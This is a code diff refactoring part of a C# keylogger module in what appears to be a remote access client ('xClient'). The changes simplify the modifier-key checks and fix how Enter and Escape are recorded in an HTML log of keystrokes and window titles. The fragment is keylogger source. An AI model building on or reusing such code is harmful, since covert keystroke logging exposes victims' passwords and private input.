@@ -100,12 +100,7 @@ namespace xClient.Core.Keylogger
                 _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" + activeWindowTitle + "</b>]</p><br>");
             }
 
-            if (_pressedKeys.Contains(Keys.LControlKey)
-                || _pressedKeys.Contains(Keys.RControlKey)
-                || _pressedKeys.Contains(Keys.LMenu)
-                || _pressedKeys.Contains(Keys.RMenu)
-                || _pressedKeys.Contains(Keys.LWin)
-                || _pressedKeys.Contains(Keys.RWin))
+            if (ModifierKeysSet())
             {
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
@@ -152,15 +147,12 @@ namespace xClient.Core.Keylogger
 
         private bool ModifierKeysSet()
         {
-            if (_pressedKeys.Contains(Keys.LControlKey)
-                || _pressedKeys.Contains(Keys.RControlKey)
-                || _pressedKeys.Contains(Keys.LMenu)
-                || _pressedKeys.Contains(Keys.RMenu)
-                || _pressedKeys.Contains(Keys.LWin)
-                || _pressedKeys.Contains(Keys.RWin))
-                return true;
-            else
-                return false;
+            return _pressedKeys.Contains(Keys.LControlKey)
+                   || _pressedKeys.Contains(Keys.RControlKey)
+                   || _pressedKeys.Contains(Keys.LMenu)
+                   || _pressedKeys.Contains(Keys.RMenu)
+                   || _pressedKeys.Contains(Keys.LWin)
+                   || _pressedKeys.Contains(Keys.RWin);
         }
 
         private string HighlightSpecialKeys(Keys[] keys)
@@ -206,10 +198,11 @@ namespace xClient.Core.Keylogger
                     case "Space":
                         normalKeys.Append("&nbsp;");
                         break;
-                    case "Enter":
+                    case "Return":
                         normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                         break;
-                        normalKeys.Append(@"<p class=""h"">[Esc]</p><br>");
+                    case "Escape":
+                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                         break;
                     default:
                         normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
